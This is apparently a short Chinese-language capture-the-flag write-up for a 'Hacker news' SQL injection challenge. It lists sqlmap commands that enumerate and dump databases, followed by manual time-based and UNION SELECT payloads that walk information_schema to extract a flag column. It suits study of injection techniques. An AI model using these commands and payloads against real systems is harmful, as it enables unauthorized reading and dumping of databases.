# Hacker news

## 自动化注入
```bash
sqlmap -r requests.txt --dbs # 列出数据库

sqlmap -r requests.txt --current-db # 当前数据库

sqlmap -r requests.txt --users  #列出用户名

sqlmap -r requests.txt -D database --tables  # 列出表名

sqlmap -r requests.txt -D database -T table_name --columns  # 列出列名

sqlmap -r requests.txt -D database -T table_name -C column_name --dump  # 列出表的内容
```

## 手工注入

```Payload
123456' and (select 1 from (select sleep(5))aaa) --  # Time-based 延时注入  

123456' union select 1,2,3 -- # 共3列，其中第2、3列会显示  

123456' union select 1,database(),user() --  # 列出当前数据库和用户（数据库news，用户user）  

123456' union select 1, table_name, 3 from information_schema.tables where table_schema='news' -- # 列出表名（secret_table表）  

123456' union select 1, column_name, 3 from information_schema.columns where table_schema='news' and table_name='secret_table' -- # 列出secret_table表的列（字段）名（发现有fl4g列）  

123456' union select 1, fl4g, 3 from secret_table -- # 得到flag
```